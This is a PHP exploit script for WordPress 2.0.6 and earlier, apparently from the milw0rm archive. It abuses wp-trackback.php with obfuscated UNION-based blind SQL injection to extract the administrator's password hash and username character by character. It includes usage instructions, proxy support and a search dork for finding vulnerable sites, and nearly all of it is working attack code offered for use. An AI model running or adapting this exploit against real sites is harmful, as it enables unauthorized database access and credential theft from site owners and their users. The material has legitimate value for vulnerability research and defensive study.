<?php
print_r('
---------------------------------------------------------------------------
Wordpress <= 2.0.6 wp-trackback.php Zend_Hash_Del_Key_Or_Index /
/ sql injection admin hash disclosure exploit
(needs register_globals=on, 4 <= PHP < 4.4.3,< 5.1.4)
by rgod
dork: "is proudly powered by WordPress"
mail: retrog at alice dot it
site: http://retrogod.altervista.org
---------------------------------------------------------------------------
');

if ($argc<3) {
    print_r('
---------------------------------------------------------------------------
Usage: php '.$argv[0].' host path OPTIONS
host:      target server (ip/hostname)
path:      path to wordpress
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
 -t[prefix]:  specify a table prefix (default: wp_)
Example:
php '.$argv[0].' localhost /wordpress/ -P1.1.1.1:80
php '.$argv[0].' localhost / -p81
---------------------------------------------------------------------------
');
    die;
}
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$proxy="";
$prefix="wp_";

for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
if ($temp=="-t")
{
  $prefix=str_replace("-t","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$chars[0]=0;//null
$chars=array_merge($chars,range(48,57)); //numbers
$chars=array_merge($chars,range(97,102));//a-f letters

function my_encode($my_string)
{
  $encoded="CHAR(";
  for ($k=0; $k<=strlen($my_string)-1; $k++)
  {
    $encoded.=ord($my_string[$k]);
    if ($k==strlen($my_string)-1) {$encoded.=")";}
    else {$encoded.=",";}
  }
  return $encoded;
}

echo "\npwd hash   -> ";
$j=1;$password="";
while (!strstr($password,chr(0)))
{
    for ($i=0; $i<=255; $i++)
    {
        if (in_array($i,$chars))
        {
		  $sql="999999/**/UNION/**/SELECT/**/(IF((ASCII(SUBSTRING(user_pass,".$j.",1))=".$i."),".my_encode("open").",".my_encode("sun-tzu")."))/**/FROM/**/".$prefix."users/**/WHERE/**/ID=1/*";
          $data ="-----------------------------7d61bcd1f033e\r\n";
          $data.="Content-Disposition: form-data; name=\"title\";\r\n\r\n";
          $data.="1\r\n";
          $data.="-----------------------------7d61bcd1f033e\r\n";
          $data.="Content-Disposition: form-data; name=\"url\";\r\n\r\n";
          $data.="1\r\n";
          $data.="-----------------------------7d61bcd1f033e\r\n";
          $data.="Content-Disposition: form-data; name=\"blog_name\";\r\n\r\n";
          $data.="1\r\n";
          $data.="-----------------------------7d61bcd1f033e\r\n";
          $data.="Content-Disposition: form-data; name=\"tb_id\";\r\n\r\n";
          $data.="$sql\r\n";
          $data.="-----------------------------7d61bcd1f033e\r\n";
          $data.="Content-Disposition: form-data; name=\"1740009377\";\r\n\r\n";
          $data.="1\r\n";
          $data.="-----------------------------7d61bcd1f033e\r\n";
          $data.="Content-Disposition: form-data; name=\"496546471\";\r\n\r\n";
          $data.="1\r\n";
          $data.="-----------------------------7d61bcd1f033e--\r\n";
          $packet ="POST ".$p."wp-trackback.php?tb_id=1 HTTP/1.0\r\n";
          $packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
          $packet.="Host: ".$host."\r\n";
          $packet.="Content-Length: ".strlen($data)."\r\n";
          $packet.="Connection: Close\r\n\r\n";
          $packet.=$data;
          sendpacketii($packet);
          if (!eregi("trackbacks are closed",$html)) {$password.=chr($i);echo chr($i);sleep(1);break;}
        }
        if ($i==255) {
            die("\nExploit failed...");
        }
    }
$j++;
}
echo "\n";

echo "admin user -> ";
$j=1;$admin="";
while (!strstr($admin,chr(0)))
{
    for ($i=0; $i<=255; $i++)
    {
          $sql="999999/**/UNION/**/SELECT/**/(IF((ASCII(SUBSTRING(user_login,".$j.",1))=".$i."),".my_encode("open").",".my_encode("sun-tzu")."))/**/FROM/**/".$prefix."users/**/WHERE/**/ID=1/*";
          $data ="-----------------------------7d61bcd1f033e\r\n";
          $data.="Content-Disposition: form-data; name=\"title\";\r\n\r\n";
          $data.="1\r\n";
          $data.="-----------------------------7d61bcd1f033e\r\n";
          $data.="Content-Disposition: form-data; name=\"url\";\r\n\r\n";
          $data.="1\r\n";
          $data.="-----------------------------7d61bcd1f033e\r\n";
          $data.="Content-Disposition: form-data; name=\"blog_name\";\r\n\r\n";
          $data.="1\r\n";
          $data.="-----------------------------7d61bcd1f033e\r\n";
          $data.="Content-Disposition: form-data; name=\"tb_id\";\r\n\r\n";
          $data.="$sql\r\n";
          $data.="-----------------------------7d61bcd1f033e\r\n";
          $data.="Content-Disposition: form-data; name=\"1740009377\";\r\n\r\n";
          $data.="1\r\n";
          $data.="-----------------------------7d61bcd1f033e\r\n";
          $data.="Content-Disposition: form-data; name=\"496546471\";\r\n\r\n";
          $data.="1\r\n";
          $data.="-----------------------------7d61bcd1f033e--\r\n";
          $packet ="POST ".$p."wp-trackback.php?tb_id=1 HTTP/1.0\r\n";
          $packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
          $packet.="Host: ".$host."\r\n";
          $packet.="Content-Length: ".strlen($data)."\r\n";
          $packet.="Connection: Close\r\n\r\n";
          $packet.=$data;
          sendpacketii($packet);
          if (!eregi("trackbacks are closed",$html)) {$admin.=chr($i);echo chr($i);sleep(1);break;}
        if ($i==255) {
            die("\nExploit failed...");
        }
    }
$j++;
}
echo "\n";

function is_hash($hash)
{
 if (ereg("([a-f0-9]{32})",trim($hash))) {return true;}
 else {return false;}
}

if (is_hash($password)) {
  echo "exploit succeeded...";
}
else {
  echo "exploit failed...";
  }

?>

# milw0rm.com [2007-01-10]
